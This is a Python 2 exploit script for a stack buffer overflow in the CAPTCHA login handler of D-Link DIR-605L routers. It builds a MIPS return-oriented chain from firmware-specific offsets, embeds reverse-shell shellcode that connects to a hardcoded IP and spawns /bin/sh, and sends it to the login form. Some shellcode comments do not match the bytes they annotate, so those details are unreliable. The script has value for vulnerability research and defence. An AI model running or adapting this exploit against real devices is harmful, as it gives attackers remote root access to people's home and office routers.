#!/usr/bin/env python
#####################################################################################
# Exploit for the DIR-605L CAPTCHA login stack based buffer overflow vulnerability.
# Spawns a reverse root shell to 192.168.1.100 on port 8080.
# Tested against firmware versions 1.10, 1.12 and 1.13.
#
# Craig Heffner
# http://www.devttys0.com
# 06-October-2012
#####################################################################################

import sys
import string
import socket
import urllib, urllib2, httplib

class MIPSPayload:

	BADBYTES = [0x00]
	LITTLE = "little"
	BIG = "big"
	FILLER = "A"
	BYTES = 4
	NOP = "\x27\xE0\xFF\xFF"

	def __init__(self, libase=0, endianess=LITTLE, badbytes=BADBYTES):
		self.libase = libase
		self.shellcode = ""
		self.endianess = endianess
		self.badbytes = badbytes

	def Add(self, data):
		self.shellcode += data

	def Address(self, offset, base=None):
		if base is None:
			base = self.libase

		return self.ToString(base + offset)

	def AddAddress(self, offset, base=None):
		self.Add(self.Address(offset, base))

	def AddBuffer(self, size, byte=FILLER):
		self.Add(byte * size)

	def AddNops(self, size):
		if self.endianess == self.LITTLE:
			self.Add(self.NOP[::-1] * size)
		else:
			self.Add(self.NOP * size)

	def ToString(self, value, size=BYTES):
		data = ""

		for i in range(0, size):
			data += chr((value >> (8*i)) & 0xFF)

		if self.endianess != self.LITTLE:
			data = data[::-1]

		return data

	def Build(self):
		count = 0

		for c in self.shellcode:
			for byte in self.badbytes:
				if c == chr(byte):
					raise Exception("Bad byte found in shellcode at offset %d: 0x%.2X" % (count, byte))
			count += 1
					
		return self.shellcode

	def Print(self, bpl=BYTES):
		i = 0

		for c in self.shellcode:
			if i == 4:
				print ""
				i = 0
			
			sys.stdout.write("\\x%.2X" % ord(c))
			sys.stdout.flush()

			if bpl > 0:
				i += 1
		print "\n"

class HTTP:

	HTTP = "http"
	HTTPS = "https"

	def __init__(self, host, proto=HTTP, verbose=False):
		self.host = host
		self.proto = proto
		self.verbose = verbose

	def Encode(self, string):
		return urllib.quote_plus(string)

	def Send(self, uri, headers={}, data=None, response=False):
		html = ""

		if uri.startswith('/'):
			c = ''
		else:
			c = '/'

		url = '%s://%s%s%s' % (self.proto, self.host, c, uri)
		if self.verbose:
			print url

		if data is not None:
			data = urllib.urlencode(data)

		req = urllib2.Request(url, data, headers)
		rsp = urllib2.urlopen(req)
		
		if response:
			html = rsp.read()

		return html



if __name__ == '__main__':

	libc = 0x408f5000
	apmib = 0x4085c000

	shellsize1 = 184
	shellcode1 = string.join([
		"\x24\x0f\xff\xfa", # li	t7,-6
		"\x01\xe0\x78\x27", # nor	t7,t7,zero
		"\x21\xe4\xff\xfd", # addi	a0,t7,-3
		"\x21\xe5\xff\xfd", # addi	a1,t7,-3
		"\x28\x06\xff\xff", # slti	a2,zero,-1
		"\x24\x02\x10\x57", # li	v0,4183
		"\x01\x01\x01\x0c", # syscall	0x40404
		"\xaf\xa2\xff\xff", # sw	v0,-1(sp)
		"\x8f\xa4\xff\xff", # lw	a0,-1(sp)
		"\x34\x0f\xff\xfd", # li	t7,0xfffd
		"\x01\xe0\x78\x27", # nor	t7,t7,zero
		"\xaf\xaf\xff\xe0", # sw	t7,-32(sp)
		"\x3c\x0e\x1f\x90", # lui	t6,0x1f90
		"\x35\xce\x1f\x90", # ori	t6,t6,0x1f90
		"\xaf\xae\xff\xe4", # sw	t6,-28(sp)

		# Big endian IP address 192.168.1.100
		"\x3c\x0e\xc0\xA8", # lui	t6,0x7f01
		"\x35\xce\x07\x16", # ori	t6,t6,0x101

		"\xaf\xae\xff\xe6", # sw	t6,-26(sp)
		"\x27\xa5\xff\xe2", # addiu	a1,sp,-30
		"\x24\x0c\xff\xef", # li	t4,-17
		"\x01\x80\x30\x27", # nor	a2,t4,zero
		"\x24\x02\x10\x4a", # li	v0,4170
		"\x01\x01\x01\x0c", # syscall	0x40404
		"\x24\x0f\xff\xfd", # li	t7,-3
		"\x01\xe0\x78\x27", # nor	t7,t7,zero
		"\x8f\xa4\xff\xff", # lw	a0,-1(sp)
		"\x01\xe0\x28\x21", # move	a1,t7
		"\x24\x02\x0f\xdf", # li	v0,4063
		"\x01\x01\x01\x0c", # syscall	0x40404
		"\x24\x10\xff\xff", # li	s0,-1
		"\x21\xef\xff\xff", # addi	t7,t7,-1
		"\x15\xf0\xff\xfa", # bne	t7,s0,68 <dup2_loop>
		"\x28\x06\xff\xff", # slti	a2,zero,-1
		"\x3c\x0f\x2f\x2f", # lui	t7,0x2f2f
		"\x35\xef\x62\x69", # ori	t7,t7,0x6269
		"\xaf\xaf\xff\xec", # sw	t7,-20(sp)
		"\x3c\x0e\x6e\x2f", # lui	t6,0x6e2f
		"\x35\xce\x73\x68", # ori	t6,t6,0x7368
		"\xaf\xae\xff\xf0", # sw	t6,-16(sp)
		"\xaf\xa0\xff\xf4", # sw	zero,-12(sp)
		"\x27\xa4\xff\xec", # addiu	a0,sp,-20
		"\xaf\xa4\xff\xf8", # sw	a0,-8(sp)
		"\xaf\xa0\xff\xfc", # sw	zero,-4(sp)
		"\x27\xa5\xff\xf8", # addiu	a1,sp,-8
		"\x24\x02\x0f\xab", # li	v0,4011
		"\x01\x01\x01\x0c"  # syscall	0x40404
	], '')	

        shellsize = 168
	shellcode = string.join([
         "\x24\x0f\xff\xfd",        #// li      t7,-3
         "\x01\xe0\x20\x27",       #// nor     a0,t7,zero
         "\x01\xe0\x28\x27",        #// nor     a1,t7,zero
         "\x28\x06\xff\xff",        #// slti    a2,zero,-1
         "\x24\x02\x10\x57",        #// li      v0,4183 ( sys_socket )
         "\x01\x01\x01\x0c",        #// syscall 0x40404
      
         "\xaf\xa2\xff\xff",        #// sw      v0,-1(sp)
         "\x8f\xa4\xff\xff",        #// lw      a0,-1(sp)
         "\x24\x0f\xff\xfd",        #// li      t7,-3 ( sa_family = AF_INET )
         "\x01\xe0\x78\x27",        #// nor     t7,t7,zero
         "\xaf\xaf\xff\xe0",        #// sw      t7,-32(sp)
         "\x3c\x0e\x7a\x69",        #// lui     t6,0x7a69 ( sin_port = 0x7a69 )
         "\x35\xce\x7a\x69",        #// ori     t6,t6,0x7a69
         "\xaf\xae\xff\xe4",        #// sw      t6,-28(sp)
          
#/* ====================  You can change ip here ;) ====================== */
         "\x3c\x0d\x0a\x08",        #// lui     t5,0xc0a8 ( sin_addr = 0xc0a8 ...
         "\x35\xad\x92\x08",        #// ori     t5,t5,0x164           ...0164 )
#/* ====================================================================== */
       
         "\xaf\xad\xff\xe6",        #// sw      t5,-26(sp)
         "\x23\xa5\xff\xe2",        #// addi    a1,sp,-30
         "\x24\x0c\xff\xef",        #// li      t4,-17 ( addrlen = 16 )    
         "\x01\x80\x30\x27",        #// nor     a2,t4,zero
         "\x24\x02\x10\x4a",        #// li      v0,4170 ( sys_connect )
         "\x01\x01\x01\x0c",        #// syscall 0x40404
      
         "\x24\x0f\xff\xfd",        #// li      t7,-3
         "\x01\xe0\x28\x27",        #// nor     a1,t7,zero
         "\x8f\xa4\xff\xff",        #// lw      a0,-1(sp)
#dup2_loop:
         "\x24\x02\x0f\xdf",        #// li      v0,4063 ( sys_dup2 )
         "\x01\x01\x01\x0c",        #// syscall 0x40404
         "\x20\xa5\xff\xff",        #// addi    a1,a1,-1
         "\x24\x01\xff\xff",        #// li      at,-1
         "\x14\xa1\xff\xfb",        #// bne     a1,at, dup2_loop
      
         "\x28\x06\xff\xff",        #// slti    a2,zero,-1
         "\x3c\x0f\x2f\x2f",        #// lui     t7,0x2f2f
         "\x35\xef\x62\x69",        #// ori     t7,t7,0x6269
         "\xaf\xaf\xff\xf4",        #// sw      t7,-12(sp)
         "\x3c\x0e\x6e\x2f",        #// lui     t6,0x6e2f
         "\x35\xce\x73\x68",        #// ori     t6,t6,0x7368
         "\xaf\xae\xff\xf8",        #// sw      t6,-8(sp)
         "\xaf\xa0\xff\xfc",        #// sw      zero,-4(sp)
         "\x27\xa4\xff\xf4",        #// addiu   a0,sp,-12
         "\x28\x05\xff\xff",        #// slti    a1,zero,-1
         "\x24\x02\x0f\xab",        #// li      v0,4011 ( sys_execve )
         "\x01\x01\x01\x0c"       #// syscall 0x40404
	],'')


	target = {
		"1.10"	: [
				0x2B194,
				0x236E0,
				0x24284,
				0x01AFC,
				0x021B0
		],
		"1.12"	: [
				0x2B954,
				0x23D30,
				0x248D4,
				0x01D78,
				0x027E8
		],
		"1.13"	: [
				0x2B954,
				0x23D30,
				0x248D4,
				0x01D78,
				0x027E8
		]
	}

	try:
		ip = sys.argv[1]
		v = sys.argv[2]
	except:
		print "Usage: %s <target ip> <target firmware version>" % sys.argv[0]
		sys.exit(1)

	if not target.has_key(v):
		print "Unknown firmware version: %s!" % v
		sys.exit(1)

	payload = MIPSPayload(endianess="big", badbytes=[0x00, 0x67])

	payload.AddBuffer(94)				# filler
	payload.AddBuffer(4)				# $s0
	payload.AddAddress(target[v][0], base=libc)	# $s1 (0x2B954)
	payload.AddAddress(target[v][1], base=libc)	# $s2 (0x23D30)
	payload.AddBuffer(4)				# $s3
	payload.AddAddress(target[v][2], base=libc)	# $ra (0x248D4)
	payload.AddBuffer(0x1C)				# filler
	payload.AddBuffer(4)				# $s0
	payload.AddAddress(target[v][3], base=apmib)	# $s1 (0x1D78)
	payload.AddBuffer(4)				# $s2
	payload.AddBuffer(4)				# $s3
	payload.AddBuffer(4)				# $s4
	payload.AddAddress(target[v][4], base=apmib)	# $ra (0x27E8)
	payload.AddBuffer(0x1C)				# filler
	payload.Add(shellcode)				# shellcode
	
	pdata = {
		'login_name'		: 'admin',
		'curTime'		: '1348588030496',
		'FILECODE'		: payload.Build(),
		'VERIFICATION_CODE'	: 'myvoiceismypassportverifyme',
		'login_n'		: 'admin',
		'login_pass'		: 'Zm9vb255b3UA',
		'VER_CODE'		: '1234'
	}

	try:
		HTTP(ip).Send('/goform/formLogin', data=pdata)
	except httplib.BadStatusLine:
		print "Payload delivered."
	except Exception, e:
		print "Payload delivery failed: %s" % str(e)

